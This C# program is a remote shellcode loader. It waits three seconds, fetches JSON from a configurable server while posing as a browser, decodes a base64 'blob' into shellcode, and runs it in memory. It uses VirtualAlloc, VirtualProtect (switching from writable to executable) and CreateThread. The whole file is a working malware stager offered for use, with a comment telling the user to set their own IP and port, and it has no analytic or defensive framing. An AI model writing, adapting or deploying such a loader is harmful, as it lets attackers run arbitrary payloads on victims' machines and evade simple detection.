using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;

class Program
{
    // WinAPI
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint newProtect, out uint oldProtect);

    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    static async System.Threading.Tasks.Task Main()
    {
        string url = "http://127.0.0.1:8000/data.json"; //Change your IP and PORT

        Thread.Sleep(3000);

        HttpClient client = new HttpClient();
        client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
        client.DefaultRequestHeaders.Add("Accept", "application/json");

        string json = await client.GetStringAsync(url);

        // Parse JSON
        using JsonDocument doc = JsonDocument.Parse(json);
        string base64 = doc.RootElement.GetProperty("blob").GetString();

      byte[] shellcode = Convert.FromBase64String(base64);

        Console.WriteLine($"[+] Received {shellcode.Length} bytes");

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x04); // PAGE_READWRITE

        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        VirtualProtect(addr, (uint)shellcode.Length, 0x20, out _); // PAGE_EXECUTE_READ

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
